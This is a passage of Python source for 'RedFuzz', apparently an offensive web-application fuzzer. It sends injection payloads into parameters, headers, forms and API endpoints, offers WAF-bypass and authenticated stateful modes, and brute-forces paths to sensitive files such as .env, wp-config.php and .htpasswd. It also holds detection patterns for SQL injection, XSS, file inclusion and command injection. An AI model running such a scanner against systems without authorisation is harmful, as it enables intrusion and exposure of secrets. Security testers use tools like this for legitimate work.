                            result = self.fuzz_parameter(test_url, param, payload, method, waf_bypass=waf_bypass)
                        else:
                            # For POST/PUT/DELETE, create test data with the payload
                            test_data = {param: payload}
                            result = self.fuzz_parameter(test_url, param, payload, method, test_data, waf_bypass=waf_bypass)
                        
                        if result:
                            results.append(result)
                            # Update TUI with vulnerability if found
                            if tui and result.get('vulnerable'):
                                tui.add_vulnerability(result)
                                tui.stats['vulnerabilities_found'] += 1
                        
                        total_requests += 1
        else:
            # Fuzz existing parameters
            for param, values in params.items():
                # Use context-aware payloads if enabled
                if context_aware:
                    param_payloads = self.generate_context_aware_payloads(param)
                else:
                    param_payloads = payloads
                
                for payload in param_payloads:
                    # Update TUI if provided
                    if tui:
                        tui.update_progress(total_requests + 1, len(payloads), url, payload)
                        tui.stats['current_url'] = url
                        tui.stats['current_payload'] = payload
                        tui.stats['total_requests'] = total_requests + 1
                    
                    result = self.fuzz_parameter(url, param, payload, method, post_data, waf_bypass=waf_bypass)
                    if result:
                        results.append(result)
                        # Update TUI with vulnerability if found
                        if tui and result.get('vulnerable'):
                            tui.add_vulnerability(result)
                            tui.stats['vulnerabilities_found'] += 1
                    
                    total_requests += 1
        
        # Fuzz headers if requested
        if fuzz_headers:
            common_headers = ['User-Agent', 'Referer', 'X-Forwarded-For', 'X-Real-IP']
            for header in common_headers:
                for payload in payloads:
                    # Update TUI if provided
                    if tui:
                        tui.update_progress(total_requests + 1, len(payloads), url, f"Header: {header}")
                        tui.stats['current_url'] = url
                        tui.stats['current_payload'] = f"Header: {header}"
                        tui.stats['total_requests'] = total_requests + 1
                    
                    result = self.fuzz_headers(url, header, payload, waf_bypass=waf_bypass)
                    if result:
                        results.append(result)
                        # Update TUI with vulnerability if found
                        if tui and result.get('vulnerable'):
                            tui.add_vulnerability(result)
                            tui.stats['vulnerabilities_found'] += 1
                    
                    total_requests += 1
        
        return results
    
    def scan_directory(self, base_url, wordlist=None):
        """Enhanced directory scanning"""
        if not wordlist:
            wordlist = [
                # Common directories
                'admin', 'login', 'wp-admin', 'administrator', 'panel',
                'backup', 'config', 'db', 'database', 'files', 'images',
                'includes', 'js', 'css', 'uploads', 'downloads', 'temp',
                'test', 'dev', 'development', 'api', 'rest', 'v1', 'v2',
                
                # Common files
                'robots.txt', 'sitemap.xml', '.htaccess', '.env', 'config.php',
                'wp-config.php', 'config.ini', 'web.config', 'phpinfo.php',
                'info.php', 'test.php', 'admin.php', 'login.php',
                
                # Backup files
                'backup.zip', 'backup.tar.gz', 'backup.sql', 'backup.bak',
                'config.bak', 'config.old', 'config.backup',
                
                # Log files
                'error.log', 'access.log', 'debug.log', 'php_error.log',
                'apache.log', 'nginx.log', 'web.log',
                
                # Hidden files
                '.git', '.svn', '.DS_Store', 'Thumbs.db', '.htpasswd',
                '.env.local', '.env.production', '.env.development'
            ]
        
        results = []
        
        def check_path(path):
            try:
                url = urljoin(base_url, path)
                response = self.session.get(url, timeout=self.timeout, verify=False)
                
                if response.status_code in [200, 301, 302, 403]:
                    return {
                        'url': url,
                        'status_code': response.status_code,
                        'path': path,
                        'size': len(response.content)
                    }
                return None
            except:
                return None
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(check_path, path) for path in wordlist]
            
            for future in as_completed(futures):
                result = future.result()
                if result:
                    results.append(result)
                    if self.verbose:
                        self.log(f"Found: {result['url']} ({result['status_code']})")
        
        return results
    
    def run(self, mode="all", custom_payloads=None, method="GET", post_data=None, fuzz_headers=False, 
            context_aware=False, waf_bypass=False, crawl=False, api_test=False, report_format="json", tui=None,
            fast_mode=False, ultra_fast_mode=False):
        """Enhanced fuzzer execution with new features"""
        import time  # Import time here for TUI functionality
        
        self.summary_log(f"Starting scan: {self.target_url}")
        if fast_mode:
            self.summary_log("Fast mode enabled")
        elif ultra_fast_mode:
            self.summary_log("Ultra fast mode enabled")
        
        # Initialize TUI if provided
        if tui:
            tui.running = True
            tui.stats['start_time'] = time.time()
        
        # Initialize results variable
        results = []
        
        if crawl:
            self.log("Starting website crawling...")
            discovered_urls, discovered_forms = self.crawl_website(self.target_url)
            self.log(f"Discovered {len(discovered_urls)} URLs and {len(discovered_forms)} forms")
            
            # Fuzz discovered endpoints
            all_results = []
            for url in discovered_urls:
                url_results = self.fuzz_url(url, self.generate_payloads(mode), method, post_data, 
                                     fuzz_headers, context_aware, waf_bypass, tui)
                all_results.extend(url_results)
            
            # Test discovered forms
            for form in discovered_forms:
                if form['method'] == 'POST':
                    form_data = {input_data['name']: input_data['value'] for input_data in form['inputs']}
                    form_results = self.fuzz_url(form['action'], self.generate_payloads(mode), 'POST', 
                                         form_data, fuzz_headers, context_aware, waf_bypass, tui)
                    all_results.extend(form_results)
            
            results = all_results
            if not tui:
                self.display_results(results)
        
        elif api_test:
            self.log("Starting REST API testing...")
            # Common API endpoints to test
            api_endpoints = [
                '/api/users', '/api/posts', '/api/comments', '/api/auth',
                '/api/v1/users', '/api/v1/posts', '/api/v2/users',
                '/rest/users', '/rest/posts', '/graphql', '/swagger',
                '/api-docs', '/openapi.json', '/swagger.json'
            ]
            
            api_results = []
            for endpoint in api_endpoints:
                url = urljoin(self.target_url, endpoint)
                result = self.test_rest_api(url, method)
                if result:
                    api_results.append(result)
            
            results = api_results
            if not tui:
                self.display_api_results(results)
        
        elif mode == "directory":
            self.log("Starting enhanced directory scan...")
            results = self.scan_directory(self.target_url)
            if not tui:
                self.display_directory_results(results)
        
        else:
            # Generate payloads
            if custom_payloads:
                payloads = custom_payloads
            else:
                payloads = self.generate_payloads(mode, fast_mode, ultra_fast_mode)
            
            # Don't log payload count - too verbose
            
            # Initialize TUI progress if provided
            if tui:
                tui.start_progress(len(payloads))
            
            # Start fuzzing
            results = self.fuzz_url(self.target_url, payloads, method, post_data, 
                                  fuzz_headers, context_aware, waf_bypass, tui)
            
            # Display results if not using TUI
            if not tui:
                self.display_results(results)
        
        # Generate reports if requested
        if report_format in ["html", "json", "both"]:
            try:
                from report_generator import ReportGenerator
                import time
                
                scan_duration = time.time() - getattr(self, 'start_time', time.time())
                report_gen = ReportGenerator()
                
                if report_format in ["html", "both"]:
                    html_file = report_gen.generate_html_report(results, self.target_url, scan_duration)
                    self.log(f"HTML report generated: {html_file}")
                
                if report_format in ["json", "both"]:
                    json_file = report_gen.generate_json_report(results, self.target_url, scan_duration)
                    self.log(f"JSON report generated: {json_file}")
                    
            except ImportError:
                self.log("Warning: Report generator not available. Install required dependencies.")
            except Exception as e:
                self.log(f"Error generating report: {str(e)}")
        
        # Stop TUI if running
        if tui:
            tui.running = False
            tui.stats['elapsed_time'] = time.time() - tui.stats['start_time']
        
        return results
    
    def display_results(self, results):
        """Enhanced results display"""
        if not results:
            self.summary_log("No vulnerabilities found.")
            return
        
        vulnerable = [r for r in results if r and r.get('vulnerable')]
        
        self.summary_log(f"Scan completed: {len(results)} requests, {len(vulnerable)} vulnerabilities found")
        
        if vulnerable:
            self.summary_log("\nVulnerabilities:")
            for vuln in vulnerable:
                self.summary_log(f"• {vuln['vulnerability_type']} in {vuln['parameter']} ({vuln.get('method', 'GET')})")
                self.summary_log(f"  Payload: {vuln['payload'][:50]}{'...' if len(vuln['payload']) > 50 else ''}")
        
        # Save results to file
        self.save_results(results)
    
    def display_api_results(self, results):
        """Display API testing results"""
        if not results:
            self.log("No API endpoints found.")
            return
        
        self.log(f"\n=== REST API Testing Results ===")
        self.log(f"Tested {len(results)} endpoints")
        
        for result in results:
            status_color = "🟢" if result['status_code'] == 200 else "🟡"
            self.log(f"{status_color} {result['method']} {result['endpoint']} - {result['status_code']} ({result['response_size']} bytes)")
        
        # Save results to file
        self.save_results(results)
    
    def display_directory_results(self, results):
        """Enhanced directory scan results display"""
        if not results:
            self.log("No directories/files found.")
            return
        
        self.log(f"\n=== Enhanced Directory Scan Results ===")
        self.log(f"Found {len(results)} items")
        
        for result in results:
            status_color = "🟢" if result['status_code'] == 200 else "🟡"
            self.log(f"{status_color} {result['status_code']} - {result['url']} ({result['size']} bytes)")
        
        # Save results to file
        self.save_results(results)
    
    def save_results(self, results):
        """Save results to JSON file"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"redfuzz_results_{timestamp}.json"
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(results, f, indent=2, ensure_ascii=False)
        
        self.log(f"Results saved to: {filename}")

    def setup_logging(self):
        """Setup logging for RedFuzz"""
        logging.basicConfig(
            level=logging.INFO if self.verbose else logging.WARNING,
            format='%(asctime)s - %(levelname)s - %(message)s'
        )
        self.logger = logging.getLogger(__name__)

    def load_openapi_spec(self, spec_file: str) -> bool:
        """Load OpenAPI/Swagger specification"""
        if not OPENAPI_AVAILABLE:
            self.log("OpenAPI support not available. Install PyYAML.")
            return False
        
        try:
            with open(spec_file, 'r') as f:
                if spec_file.endswith('.yaml') or spec_file.endswith('.yml'):
                    spec_data = pyyaml.safe_load(f)
                else:
                    spec_data = json.load(f)
            
            self.openapi_spec = OpenAPISpec(
                endpoints=spec_data.get('paths', {}),
                base_url=spec_data.get('servers', [{}])[0].get('url', ''),
                security_schemes=spec_data.get('components', {}).get('securitySchemes', {}),
                info=spec_data.get('info', {})
            )
            
            # Extract endpoints for fuzzing
            for path, methods in spec_data.get('paths', {}).items():
                for method, details in methods.items():
                    if method.upper() in ['GET', 'POST', 'PUT', 'DELETE']:
                        self.api_endpoints.append({
                            'path': path,
                            'method': method.upper(),
                            'parameters': details.get('parameters', []),
                            'requestBody': details.get('requestBody', {}),
                            'responses': details.get('responses', {})
                        })
            
            self.log(f"Loaded OpenAPI spec with {len(self.api_endpoints)} endpoints")
            return True
            
        except Exception as e:
            self.log(f"Error loading OpenAPI spec: {e}")
            return False

    def create_session_state(self, session_id: str = None) -> str:
        """Create a new session state for stateful fuzzing"""
        if session_id is None:
            session_id = hashlib.md5(f"{time.time()}".encode()).hexdigest()[:8]
        
        session_state = SessionState(
            session_id=session_id,
            cookies={},
            headers={},
            current_url=self.target_url
        )
        
        self.session_states[session_id] = session_state
        self.current_session_id = session_id
        return session_id

    def switch_session(self, session_id: str) -> bool:
        """Switch to a different session state"""
        if session_id in self.session_states:
            session_state = self.session_states[session_id]
            self.session.cookies.update(session_state.cookies)
            self.session.headers.update(session_state.headers)
            self.current_session_id = session_id
            return True
        return False

    def update_session_state(self, response: requests.Response, session_id: str = None):
        """Update session state with response data"""
        if session_id is None:
            session_id = self.current_session_id
        
        if session_id and session_id in self.session_states:
            session_state = self.session_states[session_id]
            session_state.cookies.update(self.session.cookies.get_dict())
            session_state.current_url = response.url
            
            # Check if login is required
            if 'login' in response.url.lower() or 'auth' in response.url.lower():
                session_state.login_required = True

    def verify_vulnerability(self, vulnerability: Vulnerability) -> bool:
        """Re-test a vulnerability to confirm it's not a false positive"""
        try:
            # Wait before re-testing
            time.sleep(self.verification_delay)
            
            # Re-create the request that caused the vulnerability
            evidence = vulnerability.evidence
            
            if evidence.request_method.upper() == 'GET':
                response = self.session.get(
                    evidence.request_url,
                    headers=evidence.request_headers,
                    timeout=self.timeout,
                    verify=False
                )
            else:
                response = self.session.post(
                    evidence.request_url,
                    headers=evidence.request_headers,
                    data=evidence.request_body,
                    timeout=self.timeout,
                    verify=False
                )
            
            # Check if the vulnerability still exists
            if self.detect_vulnerability_in_response(response, vulnerability.vuln_type, evidence.payload_used):
                vulnerability.verified = True
                vulnerability.false_positive = False
                self.verified_vulnerabilities.append(vulnerability)
                return True
            else:
                vulnerability.false_positive = True
                self.false_positives.append(vulnerability)
                return False
                
        except Exception as e:
            self.log(f"Error verifying vulnerability: {e}")
            return False

    def collect_evidence(self, url: str, method: str, headers: Dict, body: str, 
                        payload: str, response: requests.Response, response_time: float) -> VulnerabilityEvidence:
        """Collect detailed evidence for a vulnerability"""
        return VulnerabilityEvidence(
            request_url=url,
            request_method=method,
            request_headers=headers,
            request_body=body,
            response_status=response.status_code,
            response_headers=dict(response.headers),
            response_body=response.text,
            payload_used=payload,
            detection_time=datetime.now(),
            response_time=response_time
        )

    def detect_vulnerability_in_response(self, response: requests.Response, vuln_type: str, payload: str) -> bool:
        """Enhanced vulnerability detection with better accuracy"""
        response_text = response.text.lower()
        
        # Enhanced detection patterns
        detection_patterns = {
            'sqli': [
                'sql syntax', 'mysql error', 'oracle error', 'postgresql error',
                'sqlite error', 'microsoft ole db provider', 'unclosed quotation mark',
                'quoted string not properly terminated', 'sql command not properly ended'
            ],
            'xss': [
                '<script>alert', 'javascript:alert', 'onerror=', 'onload=',
                'onmouseover=', 'onfocus=', 'onblur=', 'onchange='
            ],
            'lfi': [
                'root:x:', '/etc/passwd', 'windows/system32', 'c:\\windows',
                'include_path', 'failed to open stream', 'no such file or directory'
            ],
            'rfi': [
                'include_path', 'failed to open stream', 'allow_url_include',
                'remote file inclusion', 'include()', 'require()'
            ],
            'command_injection': [
                'uid=', 'gid=', 'groups=', 'root:x:', 'command not found',
                'permission denied', 'access denied', 'cannot execute'
            ],
            'open_redirect': [
                'location:', 'redirecting to', 'moved permanently', 'found'
            ],
            'ssrf': [
                'internal server error', 'connection refused', 'timeout',
                'no route to host', 'network is unreachable'
            ]
        }
        
        if vuln_type in detection_patterns:
            for pattern in detection_patterns[vuln_type]:
                if pattern in response_text:
                    return True
        
        # Additional checks for specific vulnerability types
        if vuln_type == 'xss' and payload.lower() in response_text:
            return True
        
        if vuln_type == 'sqli' and any(db_error in response_text for db_error in ['error', 'exception', 'warning']):
            return True
        
        return False

    def generate_api_payloads(self, parameter_info: Dict) -> List[str]:
        """Generate payloads based on OpenAPI parameter information"""
        payloads = []
        param_type = parameter_info.get('type', 'string')
        param_format = parameter_info.get('format', '')
        
        # Generate payloads based on parameter type and format
        if param_type == 'string':
            if param_format in ['email', 'uri', 'url']:
                payloads.extend(self.payload_categories.get('open_redirect', []))
            elif param_format == 'date':
                payloads.extend(['2023-01-01', '2023/01/01', '01/01/2023'])
            else:
                payloads.extend(self.payload_categories.get('xss', []))
                payloads.extend(self.payload_categories.get('sqli', []))
        
        elif param_type == 'integer':
            payloads.extend(['0', '1', '-1', '999999999', 'null', "'1'", '"1"'])
        
        elif param_type == 'boolean':
            payloads.extend(['true', 'false', 'null', '1', '0', "'true'", '"false"'])
        
        return payloads

    def fuzz_api_endpoint(self, endpoint: Dict) -> List[Vulnerability]:
        """Fuzz a specific API endpoint"""
        vulnerabilities = []
        path = endpoint['path']
        method = endpoint['method']
        parameters = endpoint.get('parameters', [])
        
        # Build the full URL
        base_url = self.openapi_spec.base_url if self.openapi_spec else self.target_url
        full_url = urljoin(base_url, path)
        
        # Fuzz path parameters
        for param in parameters:
            if param.get('in') == 'path':
                param_name = param['name']
                param_payloads = self.generate_api_payloads(param)
                
                for payload in param_payloads:
                    # Replace path parameter
                    fuzzed_path = path.replace(f"{{{param_name}}}", payload)
                    fuzzed_url = urljoin(base_url, fuzzed_path)
                    
                    try:
                        start_time = time.time()
                        response = self.session.request(
                            method,
                            fuzzed_url,
                            timeout=self.timeout,
                            verify=False
                        )
                        response_time = time.time() - start_time
                        
                        # Check for vulnerabilities
                        for vuln_type in ['sqli', 'xss', 'lfi', 'rfi']:
                            if self.detect_vulnerability_in_response(response, vuln_type, payload):
                                evidence = self.collect_evidence(
                                    fuzzed_url, method, {}, None, payload, response, response_time
                                )
                                
                                vulnerability = Vulnerability(
                                    vuln_type=vuln_type,
                                    parameter=param_name,
                                    payload=payload,
                                    evidence=evidence,
                                    severity='High',
                                    confidence=0.8
                                )
                                
                                vulnerabilities.append(vulnerability)
                                
                                # Auto-verify if enabled
                                if self.auto_verify:
                                    self.verify_vulnerability(vulnerability)
                        
                        # Rate limiting
                        time.sleep(self.rate_limiter.get_delay())
                        self.rate_limiter.adjust_delay(response_time)
                        
                    except Exception as e:
                        self.log(f"Error fuzzing API endpoint {fuzzed_url}: {e}")
        
        return vulnerabilities

    def run_stateful_fuzzing(self, login_url: str = None, login_data: Dict = None) -> List[Vulnerability]:
        """Run stateful fuzzing with session management"""
        vulnerabilities = []
        
        # Create initial session
        session_id = self.create_session_state()
        self.stateful_mode = True
        
        # Login if provided
        if login_url and login_data:
            try:
                response = self.session.post(login_url, data=login_data, timeout=self.timeout, verify=False)
                self.update_session_state(response, session_id)
                
                if response.status_code == 200:
                    self.log("Successfully logged in, continuing with authenticated session")
                else:
                    self.log("Login failed, continuing with unauthenticated session")
                    
            except Exception as e:
                self.log(f"Error during login: {e}")
        
        # Now fuzz with session context
        parsed_url = urlparse(self.target_url)
        params = parse_qs(parsed_url.query)
        
        for param_name, param_values in params.items():
            param_payloads = self.generate_context_aware_payloads(param_name)
            
            for payload in param_payloads:
                # Apply WAF bypass techniques
                for technique in self.waf_bypass_techniques:
                    bypassed_payload = self.apply_waf_bypass(payload, technique)
                    
                    # Create fuzzed URL
                    fuzzed_params = params.copy()
                    fuzzed_params[param_name] = [bypassed_payload]
                    
                    fuzzed_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?"
                    fuzzed_url += "&".join([f"{k}={v[0]}" for k, v in fuzzed_params.items()])
                    
                    try:
                        start_time = time.time()
                        response = self.session.get(fuzzed_url, timeout=self.timeout, verify=False)
                        response_time = time.time() - start_time
                        
                        # Update session state
                        self.update_session_state(response, session_id)
                        
                        # Check for vulnerabilities
                        for vuln_type in ['sqli', 'xss', 'lfi', 'rfi', 'command_injection']:
                            if self.detect_vulnerability_in_response(response, vuln_type, bypassed_payload):
                                evidence = self.collect_evidence(
                                    fuzzed_url, 'GET', dict(self.session.headers), None, 
                                    bypassed_payload, response, response_time
                                )
                                
                                vulnerability = Vulnerability(
                                    vuln_type=vuln_type,
                                    parameter=param_name,
                                    payload=bypassed_payload,
                                    evidence=evidence,
                                    severity='High',
                                    confidence=0.8
                                )
                                
                                vulnerabilities.append(vulnerability)
                                
                                # Auto-verify if enabled
                                if self.auto_verify:
                                    self.verify_vulnerability(vulnerability)
                        
                        # Rate limiting
                        time.sleep(self.rate_limiter.get_delay())
                        self.rate_limiter.adjust_delay(response_time)
                        
                    except Exception as e:
                        self.log(f"Error in stateful fuzzing: {e}")
        
        return vulnerabilities

def main():
    parser = argparse.ArgumentParser(
        description='RedFuzz v5.0.0 - Advanced Web Application Fuzzer with Stateful Fuzzing, OpenAPI Integration, and Plugin Support',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python redfuzz.py http://example.com/page.php?id=1
  python redfuzz.py http://example.com/api/ --openapi-spec swagger.json
  python redfuzz.py http://example.com/ --stateful --login-url http://example.com/login --login-data 'user=admin&pass=admin'
  python redfuzz.py http://example.com/ --auto-verify --evidence-collection
  python redfuzz.py http://example.com/ --plugin-dir ./custom_plugins
        """
    )
    
    parser.add_argument('url', help='Target URL to fuzz')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of threads (default: 10)')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout in seconds (default: 10)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    parser.add_argument('-q', '--quiet', action='store_true', help='Quiet mode - minimal output')
    parser.add_argument('--config', help='Configuration file (YAML/JSON)')
    parser.add_argument('--proxy', help='Proxy URL (http://proxy:port or socks5://proxy:port)')
    parser.add_argument('--cookies', help='Cookies in format: name1=value1;name2=value2')
    
    # Advanced fuzzing options
    parser.add_argument('--context-aware', action='store_true', help='Enable context-aware fuzzing')
    parser.add_argument('--waf-bypass', action='store_true', help='Enable WAF bypass techniques')
    parser.add_argument('--crawl', action='store_true', help='Enable website crawling')
    parser.add_argument('--api-test', action='store_true', help='Enable REST API testing')
    
    # New v5.0.0 features
    parser.add_argument('--stateful', action='store_true', help='Enable stateful fuzzing with session management')
    parser.add_argument('--login-url', help='Login URL for stateful fuzzing')
    parser.add_argument('--login-data', help='Login data in format: user=admin&pass=admin')
    parser.add_argument('--openapi-spec', help='OpenAPI/Swagger specification file')
    parser.add_argument('--auto-verify', action='store_true', default=True, help='Auto-verify discovered vulnerabilities')
    parser.add_argument('--no-auto-verify', dest='auto_verify', action='store_false', help='Disable auto-verification')
    parser.add_argument('--evidence-collection', action='store_true', default=True, help='Collect detailed evidence')
    parser.add_argument('--no-evidence', dest='evidence_collection', action='store_false', help='Disable evidence collection')
    parser.add_argument('--plugin-dir', help='Directory containing custom plugins')
    parser.add_argument('--smart-rate-limit', action='store_true', default=True, help='Enable smart rate limiting')
    parser.add_argument('--no-rate-limit', dest='smart_rate_limit', action='store_false', help='Disable rate limiting')
    parser.add_argument('--fast', action='store_true', help='Fast mode - reduced payloads for quick testing')
    parser.add_argument('--ultra-fast', action='store_true', help='Ultra fast mode - minimal payloads for very quick testing')
    
    # Output and reporting
    parser.add_argument('--tui', action='store_true', help='Enable Text User Interface')
    parser.add_argument('--report-format', choices=['html', 'json', 'both'], help='Generate reports in specified format')
    parser.add_argument('--output', help='Output file for results')
    
    # HTTP method and data
    parser.add_argument('-m', '--method', default='GET', choices=['GET', 'POST', 'PUT', 'DELETE'], help='HTTP method (default: GET)')
    parser.add_argument('--post-data', help='POST data in format: param1=value1&param2=value2')
    parser.add_argument('--fuzz-headers', action='store_true', help='Fuzz HTTP headers')
    
    # Custom payloads
    parser.add_argument('--custom-payloads', help='File containing custom payloads')
    parser.add_argument('--payload-categories', nargs='+', help='Specific payload categories to use')
    
    args = parser.parse_args()
    
    try:
        # Initialize fuzzer
        fuzzer = RedFuzz(
            target_url=args.url,
            threads=args.threads,
            timeout=args.timeout,
            verbose=args.verbose,
            config_file=args.config
        )
        
        # Set quiet mode
        fuzzer.quiet_mode = args.quiet
        
        # Configure proxy if specified
        if args.proxy:
            fuzzer.set_proxy(args.proxy)
        
        # Configure cookies if specified
        if args.cookies:
            fuzzer.set_cookies(args.cookies)
        
        # Load OpenAPI spec if specified
        if args.openapi_spec:
            if fuzzer.load_openapi_spec(args.openapi_spec):
                print(f"Loaded OpenAPI specification: {args.openapi_spec}")
            else:
                print(f"Failed to load OpenAPI specification: {args.openapi_spec}")
                return
        
        # Configure plugin directory if specified
        if args.plugin_dir:
            fuzzer.plugin_manager.plugin_dir = Path(args.plugin_dir)
            fuzzer.plugin_manager.load_plugins()
        
        # Configure evidence collection
        fuzzer.evidence_collection = args.evidence_collection
        fuzzer.auto_verify = args.auto_verify
        
        # Configure smart rate limiting
        if not args.smart_rate_limit:
            fuzzer.rate_limiter = None
        
        # Load custom payloads if specified
        custom_payloads = []
        if args.custom_payloads:
            try:
                with open(args.custom_payloads, 'r') as f:
                    custom_payloads = [line.strip() for line in f if line.strip()]
                print(f"Loaded {len(custom_payloads)} custom payloads")
            except Exception as e:
                print(f"Error loading custom payloads: {e}")
        
        # Parse POST data if specified
        post_data = None
        if args.post_data:
            post_data = dict(item.split('=') for item in args.post_data.split('&'))
        
        # Parse login data if specified
        login_data = None
        if args.login_data:
            login_data = dict(item.split('=') for item in args.login_data.split('&'))
        
        # Check if TUI is requested
        if args.tui:
            try:
                from redfuzz_tui import RedFuzzTUI
                tui = RedFuzzTUI()
                
                # Run fuzzing with TUI integration
                print("Starting fuzzing with TUI...")
                results = fuzzer.run(
                    mode='standard',
                    custom_payloads=custom_payloads,
                    method=args.method,
                    post_data=post_data,
                    fuzz_headers=args.fuzz_headers,
                    context_aware=args.context_aware,
                    waf_bypass=args.waf_bypass,
                    crawl=args.crawl,
                    api_test=args.api_test,
                    report_format=args.report_format,
                    tui=tui,  # Pass TUI instance to run method
                    fast_mode=args.fast,
                    ultra_fast_mode=args.ultra_fast
                )
                
                # Display final results in TUI
                tui.display_results(results)
                
            except ImportError:
                print("Error: TUI module not found. Please ensure redfuzz_tui.py is available.")
                return
        else:
            # Run appropriate fuzzing mode
            results = []
            if args.stateful:
                print("Starting stateful fuzzing...")
                vulnerabilities = fuzzer.run_stateful_fuzzing(
                    login_url=args.login_url,
                    login_data=login_data
                )
                fuzzer.vulnerabilities = vulnerabilities
                results = vulnerabilities
            elif args.openapi_spec and fuzzer.openapi_spec:
                print("Starting API fuzzing with OpenAPI specification...")
                vulnerabilities = []
                for endpoint in fuzzer.api_endpoints:
                    endpoint_vulns = fuzzer.fuzz_api_endpoint(endpoint)
                    vulnerabilities.extend(endpoint_vulns)
                fuzzer.vulnerabilities = vulnerabilities
                results = vulnerabilities
            else:
                # Standard fuzzing
                results = fuzzer.run(
                    mode='standard',
                    custom_payloads=custom_payloads,
                    method=args.method,
                    post_data=post_data,
                    fuzz_headers=args.fuzz_headers,
                    context_aware=args.context_aware,
                    waf_bypass=args.waf_bypass,
                    crawl=args.crawl,
                    api_test=args.api_test,
                    report_format=args.report_format,
                    fast_mode=args.fast,
                    ultra_fast_mode=args.ultra_fast
                )
            
            # Display results
            fuzzer.display_results(results)
            
            # Generate reports if requested
            if args.report_format in ["html", "json", "both"]:
                try:
                    from report_generator import ReportGenerator
                    import time
                    
                    scan_duration = time.time() - getattr(fuzzer, 'start_time', time.time())
                    report_gen = ReportGenerator()
                    
                    if args.report_format in ["html", "both"]:
                        html_file = report_gen.generate_html_report(fuzzer.vulnerabilities, fuzzer.target_url, scan_duration)
                        print(f"HTML report generated: {html_file}")
                    
                    if args.report_format in ["json", "both"]:
                        json_file = report_gen.generate_json_report(fuzzer.vulnerabilities, fuzzer.target_url, scan_duration)
                        print(f"JSON report generated: {json_file}")
                        
                except ImportError:
                    print("Warning: Report generator not available. Install required dependencies.")
                except Exception as e:
                    print(f"Error generating report: {str(e)}")
            
            # Save results to file if specified
            if args.output:
                fuzzer.save_results(args.output)
    
    except requests.exceptions.ConnectionError:
        print("Error: Connection failed. Check if the target URL is accessible.")
    except requests.exceptions.Timeout:
        print("Error: Request timeout. The server is not responding.")
    except requests.exceptions.InvalidURL:
        print("Error: Invalid URL format. Please provide a valid URL.")
    except requests.exceptions.SSLError:
        print("Error: SSL certificate verification failed.")
    except requests.exceptions.HTTPError as e:
        print(f"Error: HTTP error occurred: {e}")
    except requests.exceptions.RequestException as e:
        print(f"Error: Request failed: {e}")
    except KeyboardInterrupt:
        print("\nScan interrupted by user.")
    except Exception as e:
        print(f"Unexpected error: {e}")

if __name__ == "__main__":
    main() 